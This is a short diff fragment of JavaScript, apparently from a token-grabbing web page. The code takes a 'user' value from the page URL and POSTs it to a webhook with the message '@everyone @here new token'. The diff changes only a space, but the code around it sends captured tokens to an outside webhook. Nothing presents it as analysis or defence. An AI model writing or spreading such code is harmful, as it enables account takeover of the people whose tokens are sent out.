@@ -86,7 +86,7 @@ var url_string = window.location.href;
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
 var postData = {
-  content: "@everyone @here new token" + currentURL
+  content: "@everyone @here new token " + currentURL
 };
 fetch(webhookURL, {
   method: "POST",
